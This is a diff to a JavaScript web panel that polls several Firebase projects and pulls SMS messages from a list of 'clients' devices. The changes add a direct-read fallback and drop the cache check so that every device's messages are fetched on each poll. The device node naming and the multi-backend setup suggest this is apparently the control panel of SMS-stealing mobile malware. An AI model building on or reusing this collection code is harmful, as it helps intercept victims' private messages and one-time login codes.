@@ -776,7 +776,7 @@ function removeFirebaseProject(id){
   firebaseConfigs.forEach(initFirebaseInstance);
   firebaseInstances.forEach(function(inst){attachLive(inst);});
   Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
-    processClientsData();
+    processClientsDataNow();
     updateFbUi();
     toast('Project removed',true);
   });
@@ -1090,6 +1090,20 @@ function mergeSmsLists(){
   return merged;
 }
 
+function fetchSmsFromPathsDirect(inst,d){
+  if(!inst||!d)return Promise.resolve([]);
+  var paths=smsPathsForDevice(d);
+  return Promise.all(paths.map(function(p){
+    return restJsonInst(inst,p).then(function(data){
+      if(!data||isFirebaseErr(data))return [];
+      return smsAsList(data).map(normalizeSms).filter(Boolean);
+    }).catch(function(){return[];});
+  })).then(function(results){
+    var args=[mergeSmsLists];
+    results.forEach(function(r){args.push(r);});
+    return mergeSmsLists.apply(null,results);
+  });
+}
 function fetchSmsFromPaths(inst,d){
   if(!inst||!d)return Promise.resolve([]);
   var hdr={'Content-Type':'application/json'};
@@ -1103,18 +1117,19 @@ function fetchSmsFromPaths(inst,d){
     schema:inst.schema||'rabel',
     device_node:d.deviceNode||'clients'
   }),cache:'no-store'}).then(function(r){return r.json();}).then(function(res){
-    if(!res||!res.ok)return [];
-    return res.messages||[];
-  }).catch(function(){return[];});
+    if(res&&res.ok&&Array.isArray(res.messages)&&res.messages.length)return res.messages;
+    return fetchSmsFromPathsDirect(inst,d);
+  }).catch(function(){
+    return fetchSmsFromPathsDirect(inst,d);
+  });
 }
 
 function loadSmsForDevice(force){
   var d=getSelDev();if(!d)return;
   var devId=d.id, seq=++_smsLoadSeq;
-  var cached=deviceSmsCache[devId];
-  var cacheFresh=cached&&cached.at&&(Date.now()-cached.at)<120000;
   document.getElementById('smsEmpty').classList.add('hidden');
   showSmsForSelectedDevice();
+  var cached=deviceSmsCache[devId];
   if(!cached||!cached.list||!cached.list.length)_smsLoading=true;
   renderSms();
   clearListeners();
@@ -1128,12 +1143,12 @@ function loadSmsForDevice(force){
   }
 
   function poll(){
-    if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
+    if(seq!==_smsLoadSeq||selDev!==devId)return;
+    if(_panelPaused)return;
     fetchSmsFromPaths(inst,d).then(applySmsList).catch(function(){applySmsList([]);});
   }
 
-  if(force||!cacheFresh)poll();
-  else _smsLoading=false;
+  poll();
   var timer=setInterval(poll,SMS_POLL_MS);
   var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq};
 
